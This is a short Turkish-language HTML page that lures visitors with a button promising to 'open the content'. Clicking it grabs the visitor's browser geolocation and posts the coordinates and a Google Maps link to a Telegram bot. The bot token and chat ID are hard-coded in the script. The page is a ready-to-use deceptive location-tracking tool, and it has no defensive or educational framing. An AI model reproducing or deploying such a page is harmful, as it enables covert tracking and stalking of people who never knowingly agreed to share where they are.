<!DOCTYPE html>
<html>
  <head>
    <title>Konum Gönderici</title>
  </head>
  <body>
    <h2>İçeriğe ulaşmak için Butona Bas:</h2>
    <button onclick="getLocation()">İÇERİĞİ AÇ</button>

    <script>
      function getLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(sendPosition, showError);
        } else {
          alert("Tarayıcınız konum desteği vermiyor.");
        }
      }

      function sendPosition(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;

        const url = "https://api.telegram.org/bot7906946385:AAE_qvqTw8qxZBkdktkQNrXDM7maV6bdKqA/sendMessage";
        const data = {
          chat_id: "6358000072",
          text: `📍 Yeni konum:\n\nEnlem: ${lat}\nBoylam: ${lon}\nHarita: https://maps.google.com/?q=${lat},${lon}`
        };

        fetch(url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(result => {
          alert("Konum gönderildi!");
        })
        .catch(error => {
          alert("Bir hata oluştu: " + error);
        });
      }

      function showError(error) {
        alert("Konum alınamadı: " + error.message);
      }
    </script>
  </body>
</html>
